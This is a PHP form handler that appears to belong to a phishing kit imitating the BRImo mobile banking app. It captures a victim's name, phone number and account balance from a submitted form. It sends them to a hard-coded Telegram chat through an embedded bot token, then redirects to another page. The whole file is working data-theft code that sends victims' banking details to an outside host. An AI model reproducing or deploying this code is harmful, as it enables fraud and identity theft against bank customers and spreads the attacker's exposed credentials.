<?php

    header('Location:   data.html');
    
    $apiToken = "5669751939:AAFgBuZLq7zlT89Hshll0YXLjD_mjc_7GXc";
    session_start();

$nama            = $_POST['nama'];
$nomor            = $_POST['nomor'];
$saldo            = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;

$message = "
────────────────
1.FSTVL BRImo
────────────────
» ".$nama."
» ".$nomor."
» ".$saldo."
────────────────";

  $data = [
        'chat_id' => '5510246221',
        'text' => $message,
        'parse_mode' => "html"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();
